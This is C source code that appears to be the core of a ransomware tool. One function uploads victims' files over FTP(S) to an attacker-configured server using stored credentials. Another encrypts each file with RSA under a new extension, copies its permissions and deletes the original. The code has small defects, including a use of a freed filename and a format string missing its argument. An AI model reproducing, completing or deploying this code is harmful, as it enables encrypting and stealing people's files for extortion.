#include <fcntl.h>
#include <sys/mman.h>

#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "../lib/log.h"
#include "../lib/rsa.h"
#include "../lib/util.h"

char *FTP_URL  = NULL;
char *FTP_USER = NULL;
char *FTP_PWD  = NULL;
char *EXT      = NULL;

void upload_file(void *arg) {
  char *file = (char *)arg;
  FILE *fp   = fopen(file, "r");
  if (NULL == fp) {
    free(file);
    return;
  }

  CURL *curl = curl_easy_init();
  if (NULL == curl) {
    free(file);
    fclose(fp);
    return;
  }

  char url[strlen(FTP_URL) + strlen(file) + 3];
  join(url, FTP_URL, file);
  replace(url, ' ', '_');

  char userpwd[strlen(FTP_USER) + strlen(FTP_PWD) + 2];
  sprintf(userpwd, "%s:%s", FTP_USER, FTP_PWD);

  debug("Uploading to FTP(S): %s", url);
  curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
  curl_easy_setopt(curl, CURLOPT_USERPWD, userpwd);
  curl_easy_setopt(curl, CURLOPT_FTP_CREATE_MISSING_DIRS, (long)CURLFTP_CREATE_DIR_RETRY);
  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_READDATA, fp);

  CURLcode res = curl_easy_perform(curl);
  if (res != CURLE_OK)
    error("Failed to upload %s: %s", file, curl_easy_strerror(res));

  curl_easy_cleanup(curl);
  free(file);
  fclose(fp);
}

void encrypt_file(void *arg) {
  EVP_PKEY_CTX *ctx = NULL;

  unsigned char in_buf[INPUT_SIZE];
  unsigned char out_buf[OUTPUT_SIZE];

  size_t in_len  = 0;
  size_t out_len = 0;

  bool success = false;

  char *in_file = (char *)arg;
  char  out_file[strlen(in_file) + strlen(EXT) + 2];

  sprintf(out_file, "%s.%s", in_file, EXT);

  FILE *in  = fopen(in_file, "r");
  FILE *out = fopen(out_file, "a");

  if (NULL == in || NULL == out) {
    debug("(%s) Failed to open in/out", in_file);
    goto FREE;
  }

  ctx = rsa_encrypt_init();
  if (NULL == ctx) {
    debug("(%s) Failed to create ctx", in_file);
    goto FREE;
  }

  while ((in_len = fread(in_buf, 1, INPUT_SIZE, in)) > 0) {
    out_len = OUTPUT_SIZE;
    if (!rsa_encrypt(ctx, in_buf, in_len, out_buf, &out_len)) {
      debug("(%s) Failed to encrypt (%lu -> %lu)", in_file, in_len, out_len);
      goto FREE;
    }

    if (fwrite(out_buf, 1, out_len, out) <= 0) {
      debug("(%s) Failed to write output", in_file);
      goto FREE;
    }

    if (in_len < INPUT_SIZE)
      break;
  }

  struct stat st;
  fstat(fileno(in), &st);

  if (!copy_stat(fileno(in), fileno(out))) {
    debug("(%s) Failed to copy perms", in_file);
    goto FREE;
  }

  if (unlink(in_file) < 0) {
    debug("(%s) Failed to unlink: %s", in_file);
    goto FREE;
  }

  success = true;

FREE:
  if (NULL != ctx)
    rsa_encrypt_free(ctx);

  if (NULL != in)
    fclose(in);

  if (NULL != out)
    fclose(out);

  free(in_file);

  if (!success) {
    error("Failed to encrypt file: %s", in_file);
    unlink(out_file);
  }
}
